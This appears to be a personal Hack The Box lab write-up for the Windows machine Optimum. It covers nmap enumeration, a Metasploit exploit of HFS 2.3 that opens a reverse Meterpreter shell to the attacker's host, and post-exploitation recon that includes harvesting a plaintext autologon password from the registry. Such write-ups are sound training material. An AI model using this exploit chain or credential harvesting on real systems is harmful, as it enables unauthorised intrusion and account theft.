# Optimum 10.10.10.8 - Windows

 - __User__: 007 - 1st Attempt
 - __Root__:

## Initial Attempt, 05/06/2020

### Enumeration

`nmap -sC -sV -oA optimum -p- 10.10.10.8`

```shell
Nmap scan report for 10.10.10.8
Host is up (0.046s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Web server on 80. Rejetto's "HTTP File Server" aka "HFS" version 2.3. Interface is reachable at / on 80. It has a login available.

Quick way in:

```shell
msf5 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.14.53:4444
[*] Using URL: http://0.0.0.0:8484/25Y4NKgPRXVfY1
[*] Local IP: http://192.168.184.128:8484/25Y4NKgPRXVfY1
[*] Server started.
[*] Sending a malicious request to /
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
[*] Payload request received: /25Y4NKgPRXVfY1
[*] Sending stage (176195 bytes) to 10.10.10.8
[*] Meterpreter session 1 opened (10.10.14.53:4444 -> 10.10.10.8:49162) at 2020-05-06 01:12:49 -0400
[!] Tried to delete %TEMP%\xMZmsfA.vbs, unknown result
[*] Server stopped.

meterpreter > getuid
Server username: OPTIMUM\kostas

meterpreter > sysinfo
Computer        : OPTIMUM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows
```

```powershell
Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00252-70000-00000-AA535
Original Install Date:     18/3/2017, 1:51:36 ��
System Boot Time:          12/5/2020, 5:04:46 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     4.095 MB
Available Physical Memory: 3.496 MB
Virtual Memory: Max Size:  5.503 MB
Virtual Memory: Available: 4.954 MB
Virtual Memory: In Use:    549 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              \\OPTIMUM
Hotfix(s):                 31 Hotfix(s) Installed.
                           [01]: KB2959936
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2920189
                           [05]: KB2928120
                           [06]: KB2931358
                           [07]: KB2931366
                           [08]: KB2933826
                           [09]: KB2938772
                           [10]: KB2949621
                           [11]: KB2954879
                           [12]: KB2958262
                           [13]: KB2958263
                           [14]: KB2961072
                           [15]: KB2965500
                           [16]: KB2966407
                           [17]: KB2967917
                           [18]: KB2971203
                           [19]: KB2971850
                           [20]: KB2973351
                           [21]: KB2973448
                           [22]: KB2975061
                           [23]: KB2976627
                           [24]: KB2977629
                           [25]: KB2981580
                           [26]: KB2987107
                           [27]: KB2989647
                           [28]: KB2998527
                           [29]: KB3000850
                           [30]: KB3003057
                           [31]: KB3014442
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.8
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

C:\>net start
net start
These Windows services are started:

   Background Tasks Infrastructure Service
   Base Filtering Engine
   COM+ Event System
   COM+ System Application
   Cryptographic Services
   DCOM Server Process Launcher
   Device Setup Manager
   DHCP Client
   Diagnostic Policy Service
   Distributed Link Tracking Client
   Distributed Transaction Coordinator
   DNS Client
   Group Policy Client
   IP Helper
   IPsec Policy Agent
   Local Session Manager
   Network List Service
   Network Location Awareness
   Network Store Interface Service
   Plug and Play
   Power
   Print Spooler
   Remote Procedure Call (RPC)
   RPC Endpoint Mapper
   Security Accounts Manager
   Server
   Shell Hardware Detection
   System Event Notification Service
   System Events Broker
   Task Scheduler
   TCP/IP NetBIOS Helper
   Themes
   User Access Logging Service
   User Profile Service
   VMware Alias Manager and Ticket Service
   VMware CAF Management Agent Service
   VMware Tools
   Windows Connection Manager
   Windows Event Log
   Windows Firewall
   Windows Font Cache Service
   Windows Management Instrumentation
   Windows Remote Management (WS-Management)
   Windows Time
   WinHTTP Web Proxy Auto-Discovery Service
   Workstation


```

```powershell
C:\>wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic qfe get Caption,Description,HotFixID,InstalledOn
Caption                                     Description      HotFixID   InstalledOn
                                            Update           KB2959936  11/22/2014
http://support.microsoft.com/?kbid=2896496  Update           KB2896496  11/22/2014
http://support.microsoft.com/?kbid=2919355  Update           KB2919355  11/22/2014
http://support.microsoft.com/?kbid=2920189  Security Update  KB2920189  11/22/2014
http://support.microsoft.com/?kbid=2928120  Security Update  KB2928120  11/22/2014
http://support.microsoft.com/?kbid=2931358  Security Update  KB2931358  11/22/2014
http://support.microsoft.com/?kbid=2931366  Security Update  KB2931366  11/22/2014
http://support.microsoft.com/?kbid=2933826  Security Update  KB2933826  11/22/2014
http://support.microsoft.com/?kbid=2938772  Update           KB2938772  11/22/2014
http://support.microsoft.com/?kbid=2949621  Hotfix           KB2949621  11/22/2014
http://support.microsoft.com/?kbid=2954879  Update           KB2954879  11/22/2014
http://support.microsoft.com/?kbid=2958262  Update           KB2958262  11/22/2014
http://support.microsoft.com/?kbid=2958263  Update           KB2958263  11/22/2014
http://support.microsoft.com/?kbid=2961072  Security Update  KB2961072  11/22/2014
http://support.microsoft.com/?kbid=2965500  Update           KB2965500  11/22/2014
http://support.microsoft.com/?kbid=2966407  Update           KB2966407  11/22/2014
http://support.microsoft.com/?kbid=2967917  Update           KB2967917  11/22/2014
http://support.microsoft.com/?kbid=2971203  Update           KB2971203  11/22/2014
http://support.microsoft.com/?kbid=2971850  Security Update  KB2971850  11/22/2014
http://support.microsoft.com/?kbid=2973351  Security Update  KB2973351  11/22/2014
http://support.microsoft.com/?kbid=2973448  Update           KB2973448  11/22/2014
http://support.microsoft.com/?kbid=2975061  Update           KB2975061  11/22/2014
http://support.microsoft.com/?kbid=2976627  Security Update  KB2976627  11/22/2014
http://support.microsoft.com/?kbid=2977629  Security Update  KB2977629  11/22/2014
http://support.microsoft.com/?kbid=2981580  Update           KB2981580  11/22/2014
http://support.microsoft.com/?kbid=2987107  Security Update  KB2987107  11/22/2014
http://support.microsoft.com/?kbid=2989647  Update           KB2989647  11/22/2014
http://support.microsoft.com/?kbid=2998527  Update           KB2998527  11/22/2014
http://support.microsoft.com/?kbid=3000850  Update           KB3000850  11/22/2014
http://support.microsoft.com/?kbid=3003057  Security Update  KB3003057  11/22/2014
http://support.microsoft.com/?kbid=3014442  Update           KB3014442  11/22/2014
```
```powershell
C:\Windows\system32>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    LegalNoticeText    REG_SZ
    Shell    REG_SZ    explorer.exe
    LegalNoticeCaption    REG_SZ
    DebugServerCommand    REG_SZ    no
    ForceUnlockLogon    REG_DWORD    0x0
    ReportBootOk    REG_SZ    1
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    AutoRestartShell    REG_DWORD    0x1
    PowerdownAfterShutdown    REG_SZ    0
    ShutdownWithoutLogon    REG_SZ    0
    Background    REG_SZ    0 0 0
    PreloadFontFile    REG_SZ    SC-Load.All
    PasswordExpiryWarning    REG_DWORD    0x5
    CachedLogonsCount    REG_SZ    10
    WinStationsDisabled    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    DisableCAD    REG_DWORD    0x1
    scremoveoption    REG_SZ    0
    ShutdownFlags    REG_DWORD    0x13
    AutoLogonSID    REG_SZ    S-1-5-21-605891470-2991919448-81205106-1001
    LastUsedUsername    REG_SZ    kostas
    AutoAdminLogon    REG_SZ    1
    DefaultUsername    REG_SZ    kostas
    DefaultPassword    REG_SZ    kdeEjDowkS*
```